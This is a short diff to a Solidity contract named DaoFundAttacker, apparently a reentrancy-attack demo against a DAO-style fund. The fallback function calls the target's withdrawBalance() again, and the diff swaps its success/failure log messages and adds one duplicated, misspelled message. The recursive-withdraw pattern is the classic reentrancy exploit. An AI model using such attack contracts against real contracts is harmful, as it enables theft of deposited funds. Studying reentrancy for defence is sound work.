@@ -41,12 +41,12 @@ contract DaoFundAttacker{
        if( goalAmount > 0 )
        {
            if(fundAddress.call(bytes4(keccak256("withdrawBalance()")))) {
-               WithdrawBalance("Failed in fallback",msg.gas);
+               WithdrawBalance("Succeeded in fallback",msg.gas);
            }
-           else WithdrawBalance("Succeeded in fallback",msg.gas);
+           else WithdrawBalance("Failed in fallback",msg.gas);
        }
        else {
-           WithdrawBalance("Is_Attack is false in fallback",msg.gas);
+           WithdrawBalance("All the goal amount withdraweAll the goal amount withdrawed.",msg.gas);
        }
    }
 
